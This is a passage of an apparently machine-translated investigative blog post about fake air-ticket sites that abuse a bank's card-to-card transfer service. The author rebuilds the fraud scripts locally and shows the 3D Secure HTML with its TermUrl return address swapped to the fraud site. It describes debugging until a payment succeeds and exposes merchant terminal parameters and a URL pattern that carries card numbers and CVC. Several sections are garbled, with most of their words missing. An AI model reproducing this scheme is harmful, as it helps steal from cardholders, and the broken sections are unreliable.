<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ONLOAD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript:OnLoadEvent();"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ACTION</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://acs3.sbrf.ru:443/acs/pa?id=QAB6XaYQTRm-t_6DHVnp2Q"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">METHOD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ThreeDform"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_self"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"PaReq"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"eJxVUmFPgzAQ/SuE966lY2iWo4aJOl1mcG7TfTK1VCCOwkpR9u9tJ3P6pbn37nLv+u7gsiu3zqdQTVHJ0PUG2HWE5FVayCx0V8ubswv3ksIyV0LET4K3SlCYi6ZhmXCKNHSTaCF24+doErywzeNyUZ7p1yCermVNHl0KhzSFXoCa/gMC6AhNJ8VzJjUFxneTuwfqYzLC54B6CKVQdzHFGAfYI8TH/pB4GNAPDZKVgl5Fi5jYx0meJtHDbLBYATpkgFet1GpPA38I6AigVVuaa12PEaqbNyY/BqoFZFlAp4GS1kaN6dIVKZ2pgu2f41s565JNs84SKbL9+z0bbXkIyFZAyrSgBHuBhz3fwcGYjMZDo3vggZVWnnojbMbvAdRWI/qb+cuAcVuZZRznPyIQXV1JYSqMlb8xpKLhVBf8Q2inZnsjbAlAp49cTa3PXBvrSKp1rqOvbZJVs/VXdPuez7vdZj59uw6t+4ciK1QYx7xz63kPANk2qF8s6m/BRP9u5BtPwMYZ"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"MD"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"161732779-506DEA0AD5677154"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/cgi-bin/cgi_link"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
</span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">OnLoadEvent</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) 
</span></span></span><span class="javascript">{
  </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.forms[</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0</span></span></span><span class="javascript">].submit();
}
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kode HTML halaman setelah itu menggantikan bagian teks, di bawah spoiler. </font><font style="vertical-align: inherit;">Kode diperoleh selama pengujian dengan menulis variabel $ pp ke file teks. </font><font style="vertical-align: inherit;">Baris 174 dari skrip payp2p.php.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kode Halaman HTML 3D Aman Setelah Mengganti String</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ONLOAD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript:OnLoadEvent();"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ACTION</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://acs3.sbrf.ru:443/acs/pa?id=QAB6XaYQTRm-t_6DHVnp2Q"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">METHOD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ThreeDform"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_self"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"PaReq"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"eJxVUmFPgzAQ/SuE966lY2iWo4aJOl1mcG7TfTK1VCCOwkpR9u9tJ3P6pbn37nLv+u7gsiu3zqdQTVHJ0PUG2HWE5FVayCx0V8ubswv3ksIyV0LET4K3SlCYi6ZhmXCKNHSTaCF24+doErywzeNyUZ7p1yCermVNHl0KhzSFXoCa/gMC6AhNJ8VzJjUFxneTuwfqYzLC54B6CKVQdzHFGAfYI8TH/pB4GNAPDZKVgl5Fi5jYx0meJtHDbLBYATpkgFet1GpPA38I6AigVVuaa12PEaqbNyY/BqoFZFlAp4GS1kaN6dIVKZ2pgu2f41s565JNs84SKbL9+z0bbXkIyFZAyrSgBHuBhz3fwcGYjMZDo3vggZVWnnojbMbvAdRWI/qb+cuAcVuZZRznPyIQXV1JYSqMlb8xpKLhVBf8Q2inZnsjbAlAp49cTa3PXBvrSKp1rqOvbZJVs/VXdPuez7vdZj59uw6t+4ciK1QYx7xz63kPANk2qF8s6m/BRP9u5BtPwMYZ"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"MD"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"161732779-506DEA0AD5677154"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://p2p.localhost/sus.php?cd=BX3FKT"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
</span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">OnLoadEvent</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) 
</span></span></span><span class="javascript">{
  </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.forms[</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0</span></span></span><span class="javascript">].submit();
}
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Singkatnya, dalam kode HTML halaman 3D Secure (dalam contoh ini, dari Sberbank) baris:</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/cgi-bin/cgi_link"</span></span></span><span class="hljs-tag">&gt;</span></span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Secara pemrograman berubah menjadi:</font></font><br>
 <br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://p2p.localhost/sus.php?cd=BX3FKT"</span></span></span><span class="hljs-tag">&gt;</span></span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
String pengganti adalah alamat halaman tempat kartu bank pengirim, setelah memeriksa kode 3D Secure, harus mengembalikan pengguna. Sebelum skrip menggantikan baris, situs web Promsvyazbank ditetapkan sebagai alamat pengirim. Setelah skrip mengganti baris, beberapa halaman di situs penipuan sudah ditunjukkan sebagai alamat pengirim.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya tidak sepenuhnya mengerti pada titik apa alamat pengirim diganti, tetapi berfungsi. Pada saat itu, ketika browser menampilkan halaman https Sberbank dengan permintaan untuk memasukkan kode 3D Secure, jika Anda melihat kode HTML sumber halaman di browser, tidak ada alamat pengirim ke situs mana pun. Kode HTML halaman ini memiliki panjang lebih dari 400 baris dan benar-benar berbeda dari kode HTML halaman respons Sberbank yang disajikan di atas, yang ditangkap dengan menulis variabel $ page (baris 166) dan $ pp (line 174) ke disk.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jika Anda memasukkan kode 3D Secure yang salah, Sberbank pada halamannya menampilkan pesan bahwa kode tersebut salah, dan mengirim SMS lain. Segera setelah kode yang benar dimasukkan, maka akan diarahkan ke situs pembayaran atau ke situs pengganti. Artinya, mungkin, pengalihan ke situs pembayaran itu sendiri menyiratkan bahwa dari Sberbank semua prosedur yang diperlukan telah selesai. Sberbank di sini berfungsi sebagai contoh untuk pengujian. Transfer juga dapat dilakukan melalui bank lain.</font></font><br>
<br>
<img src="https://habrastorage.org/files/67f/61d/011/67f61d0110d6481ca5115d314953530c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dari sisi "pembeli tiket" itu terlihat seperti ini. Pembeli pada bentuk pembayaran yang telah disiapkan memasuki nomor kartunya. Setelah itu, halaman konfirmasi kode 3D Aman segera ditampilkan dan SMS dengan kode konfirmasi tiba. Halaman 3D Secure di browser ditampilkan di situs web bank penerbit kartu pembeli menggunakan protokol HTTPS. Halaman dengan formulir untuk memasukkan nomor kartu mungkin terlihat mencurigakan, tetapi konfirmasi 3D Secure di situs web bank Anda tidak menyebabkan keraguan atau kecurigaan. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Omong-omong, perhatikan tanda tangan “pembayaran tiket” di baris “Keterangan” pada halaman 3D Secure dari Sberbank. Tanda tangan ini diatur dalam skrip payp2p.php. Dalam contoh di masa mendatang, kami akan mencoba mengubahnya. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita kembali ke pengujian.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya memasukkan kode dari SMS pada halaman Sberbank dan setelah mengklik tombol "Kirim", saya menerima peringatan bahwa data akan dikirim melalui koneksi yang tidak aman. </font></font><br>
<br>
<img src="https://habrastorage.org/files/f0c/33c/ce6/f0c33cce63e54f30b07837ae52bd52c8.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Setelah saya mengkonfirmasi bahwa saya setuju dengan pengiriman data melalui koneksi yang tidak aman, saya dialihkan ke </font></font><br>
<br>
<img src="https://habrastorage.org/files/e86/a82/2f6/e86a822f66024701ade52e4bc3388a38.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
halaman </font><font style="vertical-align: inherit;">/sus.php?cd=… .Ini </font><font style="vertical-align: inherit;">adalah halaman kembali. Alamat pengembalian diatur dalam skrip. Dalam hal ini, halaman tidak ditemukan. Tetapi alasannya jelas - halaman kembali tidak dipersiapkan sebelumnya. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Meskipun tujuannya hampir tercapai, </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uang dari kartu ke kartu benar-benar tidak lulus</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Tidak ada sms tambahan dengan informasi bahwa pembayaran ditolak, dll.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya memutuskan bahwa alasan kegagalan dalam upaya pertama adalah bahwa situs lokal (localhost) bekerja pada koneksi http tidak aman, dan situs Sberbank pada protokol http aman. Http dan https tidak saling bersahabat satu sama lain. Ngomong-ngomong, ini menjelaskan mengapa situs curang yang dijelaskan di bagian pertama publikasi menggunakan koneksi https aman, meskipun dengan sertifikat paling sederhana. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untuk memverifikasi asumsi ini, saya harus mengkonfigurasi protokol https di situs lokal. Untuk melakukan ini, domain p2p.localhost lokal dan sertifikat yang ditandatangani sendiri dibuat. Akibatnya, alamat baru dengan skrip uji mulai terlihat seperti ini: Selain </font></font><br>
<br>
<code>https://p2p.localhost/payp2p.php</code><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
itu, alamat halaman tempat pengembalian harus dilakukan setelah memasukkan kode 3D Secure diubah dalam skrip. Halaman kembali itu sendiri juga sudah disiapkan sebelumnya.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami mencoba lagi untuk melakukan pembayaran dengan situs lokal yang berfungsi melalui protokol https. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ketika Anda terhubung untuk pertama kalinya, browser secara alami bersumpah pada koneksi aman yang tidak dikonfigurasi dengan benar. Ini karena fakta bahwa kami memiliki sertifikat yang ditandatangani sendiri. </font></font><br>
<br>
<img src="https://habrastorage.org/files/8d1/ff3/73f/8d1ff373f65d4f70af5fa16538e13d5d.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Karena sumber sertifikat diketahui, kami menambahkannya ke pengecualian. </font></font><br>
<br>
<img src="https://habrastorage.org/files/06a/317/d22/06a317d220884c5b93844dff1929907e.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Itu saja. Sekarang koneksi dibuat melalui https dan ketika beralih dari situs web Sberbank, peringatan itu hilang. </font></font><br>
<br>
<img src="https://habrastorage.org/files/df9/2c7/ad5/df92c7ad553e492e9192167abb150826.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Setelah memasukkan kode 3D Secure, pengembalian ke halaman yang disiapkan secara khusus dilakukan dengan benar. </font></font><br>
<br>
<img src="https://habrastorage.org/files/0a7/21a/677/0a721a677a9a46e68605c7f03beb4bc4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Semuanya berfungsi dengan baik kecuali </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bahwa uang tidak benar-benar berfungsi</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Akibatnya, saya harus menguji dan mencari selama beberapa hari, apa alasannya.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya hanya memiliki sebagian file yang digunakan di salah satu situs tiket pesawat palsu. Di antara file yang dikirim kepada saya, ada file payment.php. Ini mirip dengan skrip yang diuraikan di atas. Dilihat oleh kode, itu mungkin dibuat bukan untuk menipu pengunjung di "situs pertempuran", tetapi untuk pengujian oleh programmer-pengembang kemungkinan mentransfer dari satu kartu ke kartu lain melalui layanan 3ds.payment.ru. Itu tidak mungkin, tetapi secara teoritis dalam versi awal situs penipuan, itu dapat digunakan tidak hanya untuk pengujian. </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Saya mencoba melakukan pembayaran menggunakan skrip payment.php alternatif dan pembayaran berlalu pertama kali.</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Satu-satunya konfirmasi pembayaran yang berhasil ditampilkan di situs web 3ds.payment.ru. </font><font style="vertical-align: inherit;">Saya memutuskan bahwa karena skrip ini berfungsi, dimungkinkan untuk menemukan alasan mengapa skrip pertama dalam uraian (payp2p.php) tidak berfungsi.</font></font><br>
<br>
<img src="https://habrastorage.org/files/113/941/882/1139418821c64ae4a67cdefba3b3fd59.png"><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kode skrip penuh payment.php di bawah spoiler</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/c65/c1f/56d/c65c1f56d0fe4e8c895bfbcd98109349.png"><br>
     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Deskripsi perbedaan antara skrip payment.php dan payp2p.php</font></font></b><div class="spoiler_text">     .    .<br>
<br>
 payp2p.php       POST  .  payment.php     GET    .  ,      ,       :<br>
<br>
<code>https://p2p.localhost/payment.php?card_1=1111&amp;card_2=2222...&amp;cvc=999...&amp;price=30... </code><br>
<br>
    ,         « ».<br>
<br>
Payment.php    payp2p.php       MySQL.        .       .<br>
<br>
Payment.php      .        ,     .   ,  payp2p.php    ,   ,  payment.php      . TERMINAL=24043210, MERCH_NAME=PSB, MERCHANT=000601224043202, EMAIL=lakhtin%40psbank.ru, TRTYPE=8 (    TRTYPE    .   payp2p.php  ).<br>
<br>
  — payment.php         <code>https://3ds.payment.ru/cgi-bin/is_3DS</code>.          <code>{"IS_ACTIVE":"Y"}</code>      ,        (   3D Secure).<br>
<br>
    .      payment.php     .  ,        3ds.payment.ru.<br>
</div></div><br>
<blockquote>  …  ,       Firefox,  «»  payment.php      («Firefox/3.0.3»),  ,          , ,           . ,  3.5 Firefox    2009 ,  4 Firefox     2011,      payp2p.php ,  «Firefox/38.0»,      2016  — Firefox 49.</blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kemudian ada upaya untuk memperbaiki skrip payp2p.php yang tidak berfungsi karena suatu alasan, untuk memperbaikinya, mengambil skrip yang berfungsi sebagai dasar. Berbagai opsi telah dicoba. Semua bagian kode yang entah bagaimana dapat memengaruhi pekerjaan pada gilirannya ditransfer dari script yang bekerja ke yang tidak bekerja. Antara lain, ada upaya untuk koneksi menengah tambahan ke </font></font><code>https://3ds.payment.ru/cgi-bin/is_3DS</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">; mengubah, menyalakan dan mematikan opsi CURL, dll. Tidak ada yang membantu, bunga batu tidak keluar. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kemudian, selama pengujian, diputuskan untuk mematikan pengalihan pada tahap akhir di payp2p.php. Setelah itu, menjadi mungkin untuk membaca pesan kesalahan dari Promsvyazbank. Cuplikan layar kesalahan di bawah ini. Di browser setelah upaya gagal melakukan pembayaran, halaman lain ditampilkan, tetapi jika Anda mengklik "Kembali" satu kali atau lebih, Anda dapat melihat halaman ini.</font></font><br>
<br>
<img src="https://habrastorage.org/files/11f/86c/ecd/11f86cecd02b46828d04419e18f8354b.png"><br>
<blockquote>: <br>
<br>
,         . <br>
<br>
  : /   (/)<br>
,       ,    / </blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ada beberapa batasan jumlah pembayaran dari satu kartu per hari di situs web Promsvyazyazbank, dll. Meskipun saya tidak melampaui batas jumlah pembayaran nyata, ada kemungkinan bahwa pembayaran tidak melalui tahap tertentu karena banyaknya upaya saya. (Untuk menangkap nilai variabel selama debugging, saya memulai proses pembayaran berkali-kali, tetapi tidak menyelesaikannya) Saya tidak tahu alasan pasti untuk pesan ini. Setiap upaya untuk membayar ORDER_NUM dan TIMESTAMP menggunakan yang baru. Mereka seharusnya tidak memengaruhi tampilan kesalahan semacam itu. Meskipun kartu yang saya gunakan untuk pembayaran, satu pembayaran yang berhasil melewati skrip payment.php alternatif, mungkin kartu dari pengirim atau penerima masuk ke dalam stoplist.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Skrip payp2p.php sudah sedikit seperti keadaan aslinya. Saya sendiri mulai bingung apa yang saya ganti di dalamnya dan apa yang tidak. Oleh karena itu, saya mengembalikannya ke bentuk aslinya, kecuali bahwa pada baris terakhir pengalihan pengalihan ke halaman pembayaran yang berhasil dinonaktifkan. Nomor kartu pengirim dan penerima untuk upaya selanjutnya digunakan baru. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Akhirnya, dengan bantuan payp2p.php ternyata membuat pembayaran berhasil. </font></font><br>
<br>
<img src="https://habrastorage.org/files/9cd/606/539/9cd60653958e4dda9fa38ef0e9826092.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Perhatikan tanda tangan di baris "Deskripsi". </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Setelah memasukkan kode konfirmasi 3D Secure, pengembalian dilakukan ke halaman Promsvyazbak: </font></font><br>
<br>
<img src="https://habrastorage.org/files/fed/cb7/370/fedcb7370bcb4995a20a9a7218c6bdbc.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
